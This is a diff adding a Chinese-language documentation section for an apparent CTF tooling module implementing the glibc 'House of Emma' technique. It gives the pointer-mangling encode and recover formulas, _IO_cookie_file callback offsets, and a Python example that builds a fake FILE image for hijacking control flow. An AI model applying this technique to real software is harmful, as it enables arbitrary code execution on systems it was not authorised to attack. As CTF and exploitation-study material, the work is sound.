@@ -44,6 +44,126 @@
 
 fake `_IO_cookie_file` 的字段偏移、四个回调槽的位置，以及 `rol64(pointer ^ guard, 17)` 的编码关系都写在了这份较新的 C PoC 末尾。
 
+## Python 离线板子
+
+[`emma.py`](./emma.py) 提供 `build_house_of_emma`、`encode_cookie_callback` 和 `recover_pointer_guard`。
+
+### 函数用途
+
+生成 `_IO_cookie_file` 的 cookie 与四个回调槽，按版本处理明文或 PTR_MANGLE 编码。
+
+### 对应 PoC
+
+- [`poc_cookie_callback_2.23.c`](./poc_cookie_callback_2.23.c)：2.23 明文回调；
+- [`poc_cookie_callback_2.24_2.43.c`](./poc_cookie_callback_2.24_2.43.c)：2.24+ 从已知明文/密文恢复 pointer_guard 后编码攻击回调。
+
+### 编码公式
+
+```c
+encoded = rol64(callback ^ pointer_guard, 17)
+pointer_guard = ror64(encoded, 17) ^ known_callback
+```
+
+### `_IO_cookie_file` 关键偏移
+
+```text
+FILE + 0xe0  cookie
+FILE + 0xe8  read callback
+FILE + 0xf0  write callback
+FILE + 0xf8  seek callback
+FILE + 0x100 close callback
+```
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本，支持 `2.23`～`2.43`。 |
+| `file_addr` | fake `_IO_cookie_file` 起点。 |
+| `cookie_addr` | 写入 `FILE+0xe0` 的 cookie 参数。 |
+| `callback_addr` | 要消费的 write callback 明文地址；函数按版本编码。 |
+| `pointer_guard` | 2.24+ 的 pointer guard；未知时函数拒绝生成密文。 |
+| `read_addr` / `seek_addr` / `close_addr` | 其余三个 cookie callback 槽，默认 0，按题目实际触发路径补充。 |
+
+### 返回对象
+
+返回一个 `MemoryWrite`。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+本次返回内容：
+
+```text
+address: file_addr
+data:    0x108 字节 cookie FILE 镜像
+label:   "cookie FILE (<version>)"
+```
+
+镜像关键字段：
+
+```text
++0xe0  cookie = cookie_addr
++0xe8  read callback（明文或编码）
++0xf0  write callback（明文或编码）
++0xf8  seek callback（明文或编码）
++0x100 close callback（明文或编码）
+```
+
+### 辅助函数
+
+```python
+encode_cookie_callback(callback_addr, pointer_guard, mangled=bool) -> int
+recover_pointer_guard(known_callback_addr, encoded_callback) -> int
+```
+
+`recover_pointer_guard` 用于 CTF 中“已知函数指针 + UAF 读密文”的场景：从真实 `fopencookie` 对象的槽位读出编码后的 benign 回调，反推 pointer_guard。
+
+### 最小使用示例
+
+```python
+from emma import build_house_of_emma, encode_cookie_callback, recover_pointer_guard
+
+# 场景一：已知明文 callback 和泄露的密文，恢复 pointer_guard
+known_cb = 0x7fff1234          # 例如 benign_write
+encoded = 0xdeadbeefcafebabe   # 从 cookie FILE +0xf0 读出的密文
+guard = recover_pointer_guard(known_cb, encoded)
+
+# 场景二：生成攻击用 cookie FILE 镜像
+writes = build_house_of_emma(
+    version="2.35",
+    file_addr=0x100000,         # fake _IO_cookie_file
+    cookie_addr=0x200000,       # cookie 参数
+    callback_addr=0x401234,     # write callback（明文）
+    pointer_guard=guard,        # 2.24+ 必填
+)
+
+w = writes[0]
+print(w.label, hex(w.address), w.data.hex())
+# +0xe8 read / +0xf0 write / +0xf8 seek / +0x100 close
+```
+
+### 调用者必须提供
+
+```text
+libc 基址
+2.24+ 的 pointer_guard，或能通过已知明文/密文恢复它
+能投递 fake _IO_cookie_file 或覆盖现有 cookie FILE 的原语
+能触发 cookie read/write/seek/close 的入口
+```
+
+### 函数不负责
+
+```text
+不把 fake FILE 挂到 _IO_list_all
+不负责 cookie FILE 的 flags/缓冲区条件
+不触发 fwrite/fclose 等消费点
+不负责 2.23 与 2.24+ 之间的格式差异之外的其他投递
+```
+
 ## 迁移与调试
 
 1. 先确认投递路径和最终触发点在目标 Build ID 上都真实存在。
